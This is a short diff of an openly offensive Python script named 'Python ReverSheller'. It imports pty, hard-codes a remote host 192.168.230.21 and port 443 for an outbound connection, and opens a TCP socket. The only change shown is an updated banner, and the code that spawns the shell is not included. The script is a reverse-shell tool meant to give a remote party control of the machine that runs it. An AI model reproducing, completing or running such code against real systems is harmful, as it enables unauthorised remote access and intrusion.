@@ -16,7 +16,7 @@ from pty import*
 rhost = '192.168.230.21' # Set here different Host to connect
 rport =  443             # Set here different Port to connect
 
-print "< Python ReverSheller >" # Simple banner
+print "< Python ReverSheller V 1.0>" # Simple banner
 print "[+] Running ..." #########################
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket_Variable
